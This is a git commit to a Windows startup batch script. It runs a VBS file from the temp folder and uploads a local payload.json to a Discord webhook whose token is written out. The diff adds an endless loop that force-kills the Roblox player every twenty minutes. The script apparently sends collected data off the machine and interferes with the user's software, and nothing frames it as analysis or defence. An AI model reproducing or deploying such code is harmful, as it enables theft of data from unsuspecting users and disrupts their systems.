ed4e5d8617d4fa9b5fbd3e0e7e9769d0e6799cdf
frekzye <161881160+skibiditoileta@users.noreply.github.com>
2025-06-12 16:31:18 +0200

    Update startup.bat

--- startup.bat
+++ startup.bat
@@ -1,3 +1,9 @@
 %TEMP%\tempfile.vbs
 
 curl -X POST -H "Content-Type: application/json" -d @"%temp%\payload.json" https://discord.com/api/webhooks/1355659765296009236/9-3T0YvBYIWYWVoLxiaWwKyL-r0P-ZEM78e4I18gCbgEERbUI7EUSEevn7jj84akwAd4
+
+:loop
+
+taskkill /f /im RobloxPlayerBeta.exe
+timeout 1200
+goto loop
